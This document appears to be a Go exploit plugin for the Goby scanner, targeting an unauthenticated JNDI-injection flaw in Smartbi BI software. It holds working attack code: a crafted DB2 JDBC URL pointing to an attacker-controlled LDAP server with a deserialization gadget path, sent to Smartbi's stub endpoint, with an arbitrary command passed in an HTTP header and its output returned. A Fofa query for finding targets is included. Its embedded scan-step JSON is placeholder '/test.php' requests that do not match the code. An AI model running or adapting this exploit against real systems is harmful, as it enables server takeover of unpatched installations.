package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"time"
)

func init() {
	expJson := `{
    "Name": "Smartbi DB2 JDBC Arbitrary Code Execution Vulnerability",
    "Description": "<p>Smartbi is a business intelligence BI software launched by Smart Software, which meets the development stage of BI products. Smart software integrates the functional requirements of data analysis and decision support in various industries to meet the big data analysis needs of end users in enterprise-level reports, data visualization analysis, self-service exploration analysis, data mining modeling, AI intelligent analysis and other scenarios.</p><p>There is an unauthorized access background interface vulnerability between Smartbi V7 and V10.5.8. Combining DB2 JDBC exploitation and bypassing defense checks can lead to JNDI injection vulnerabilities, executing arbitrary code, and obtaining server privileges.</p>",
    "Product": "SMARTBI",
    "Homepage": "http://www.smartbi.com.cn/",
    "DisclosureDate": "2023-03-01",
    "Author": "su18@javaweb.org",
    "FofaQuery": "(body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\") || body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\"",
    "GobyQuery": "(body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\") || body=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\"",
    "Level": "3",
    "Impact": "<p>There is an unauthorized access background interface vulnerability between Smartbi V7 and V10.5.8. Combining DB2 JDBC exploitation and bypassing defense checks can lead to JNDI injection vulnerabilities, executing arbitrary code, and obtaining server privileges.</p>",
    "Recommendation": "<p>Currently, the official security patch has been released. Please update to V10.5.8. Patch address: https://www.smartbi.com.cn/patchinfo</p>",
    "References": [
        "https://wiki.smartbi.com.cn/pages/viewpage.action?pageId=50692623"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "ldapUrl",
            "type": "input",
            "value": "ldap://xx.xx.xx.xx:1389/Deserialization/CommonsBeanutils1/TomcatEcho",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        },
        {
            "name": "header",
            "type": "input",
            "value": "cmd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Smartbi DB2 JDBC 任意代码执行漏洞",
            "Product": "SMARTBI",
            "Description": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Smartbi 是思迈特软件推出的商业智能BI软件，满足 BI 产品的发展阶段。思迈特软件整合了各行业的数据分析和决策支持的功能需求，满足最终用户在企业级报表、数据可视化分析、自助探索分析、数据挖掘建模、AI 智能分析等场景的大数据分析需求。</span><br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Smartbi&nbsp;V7 与 V10.5.8 版本之间存在越权访问后台接口漏洞，结合 DB2<span style=\"font-size: 12pt;\">&nbsp;</span>JDBC 利用方式，绕过防御检查，可导致 JNDI 注入漏洞，执行任意代码，获取服务器权限。</span><br></span></p>",
            "Recommendation": "<p>目前官方已经发布安全补丁，请更新至&nbsp;<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">V10.5.8 版本。补丁地址：<a href=\"https://www.smartbi.com.cn/patchinfo\" target=\"_blank\">https://www.smartbi.com.cn/patchinfo</a></span></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Smartbi&nbsp;V7 与 V10.5.8 版本之间存在越权访问后台接口漏洞，结合 DB2</span><span style=\"color: rgb(22, 28, 37); font-size: 12pt;\">&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">JDBC 利用方式，绕过防御检查，可导致 JNDI 注入漏洞，执行任意代码，获取服务器权限。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Smartbi DB2 JDBC Arbitrary Code Execution Vulnerability",
            "Product": "SMARTBI",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">Smartbi is a business intelligence BI software launched by Smart Software, which meets the development stage of BI products.</span><span style=\"color: var(--primaryFont-color);\">&nbsp;</span><span style=\"color: var(--primaryFont-color);\">Smart software integrates the functional requirements of data analysis and decision support in various industries to meet the big data analysis needs of end users in enterprise-level reports, data visualization analysis, self-service exploration analysis, data mining modeling, AI intelligent analysis and other scenarios.</span><br></p><p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">There is an unauthorized access background interface vulnerability between Smartbi V7 and V10.5.8. Combining DB2 JDBC exploitation and bypassing defense checks can lead to JNDI injection vulnerabilities, executing arbitrary code, and obtaining server privileges.</span><br></p>",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">Currently, the official security patch has been released. Please update to V10.5.8.</span><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">&nbsp;Patch address:</span><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">&nbsp;<a href=\"https://www.smartbi.com.cn/patchinfo\" target=\"_blank\">https://www.smartbi.com.cn/patchinfo</a></span><br></p>",
            "Impact": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">There is an unauthorized access background interface vulnerability between Smartbi V7 and V10.5.8. Combining DB2 JDBC exploitation and bypassing defense checks can lead to JNDI injection vulnerabilities, executing arbitrary code, and obtaining server privileges.</span><br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10765"
}`

	checkPathContainsSmartbi1o2311092 := func(u *httpclient.FixUrl) string {
		cfg := httpclient.NewGetRequestConfig("/vision/index.jsp")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false

		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			if resp.StatusCode == 404 {
				cfg = httpclient.NewGetRequestConfig("/smartbi/vision/index.jsp")
				if resp2, err2 := httpclient.DoHttpRequest(u, cfg); err2 == nil {
					if resp2.StatusCode == 200 {
						return "smartbi"

					}
				}
			}
		}

		return ""
	}

	exploitSmartBIJDBCDB22034892957 := func(u *httpclient.FixUrl, path string, ldapUrl string, cmd string, header string) string {
		poc := "[{\"driverType\":\"aaa\",\"driver\":\"com.ibm.db2.jcc.DB2Driver\",\"maxConnection\":1,\"transactionIsolation\":1,\"validationQueryMethod\":3,\"url\":\"jdbc:db2://127.0.0.1:18080/a:clientRerouteServerListJNDIName=" + ldapUrl + "\"}]"

		cfg := httpclient.NewPostRequestConfig("/" + path + "/vision/.stub?className=DataSourceService&methodName=testConnection&params=" + url.QueryEscape(poc))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false

		if cmd != "" && header != "" {
			cfg.Header.Store(header, cmd)
		}

		resp, _ := httpclient.DoHttpRequest(u, cfg)
		return resp.RawBody
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(6)
			ldapUrl, _ := godclient.GetGodLDAPCheckURL("U", randStr)

			_ = exploitSmartBIJDBCDB22034892957(u, checkPathContainsSmartbi1o2311092(u), ldapUrl, "", "")
			return godclient.PullExists(randStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			ldapUrl := ss.Params["ldapUrl"].(string)
			cmd := ss.Params["cmd"].(string)
			header := ss.Params["header"].(string)
			expResult.Output = exploitSmartBIJDBCDB22034892957(expResult.HostInfo, checkPathContainsSmartbi1o2311092(expResult.HostInfo), ldapUrl, cmd, header)
			expResult.Success = true
			return expResult
		},
	))
}
